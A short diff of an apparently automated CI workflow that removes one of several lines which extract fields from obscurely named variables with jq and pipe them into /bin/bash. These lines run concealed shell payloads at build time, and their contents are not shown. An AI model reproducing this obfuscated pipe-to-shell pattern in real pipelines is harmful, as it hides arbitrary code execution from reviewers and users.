@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$eskwe8" | jq -r .l2 | /bin/bash
           echo $ajy78209 | jq -r .pta134 | /bin/bash
           echo $ccxjq56767 | jq -r .xqc19 | /bin/bash
-          echo $npyc723 | jq -r .e6 | /bin/bash
           printf '%s' "$npddc462" | jq -r .ro2 | /bin/bash
           printf '%s' "$nxprn90" | jq -r .mhh0 | /bin/bash
           printf '%s' "$nz3" | jq -r .qr8 | /bin/bash
